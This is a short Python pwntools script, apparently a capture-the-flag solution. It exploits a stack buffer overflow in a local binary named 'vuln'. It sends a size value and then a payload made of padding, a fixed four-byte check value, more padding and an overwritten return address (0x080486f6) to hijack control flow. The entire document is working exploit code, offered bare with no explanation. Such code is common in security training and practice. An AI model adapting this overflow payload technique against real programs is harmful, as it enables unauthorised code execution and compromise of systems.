from pwn import *
for j in range(33,34):
    p = process("./vuln")
    p.sendline("56")
    p.sendline("a"*32 + "oo&F"+"a"*16+"\xf6\x86\x04\x08" )
    resp = p.recvall()
    print(resp)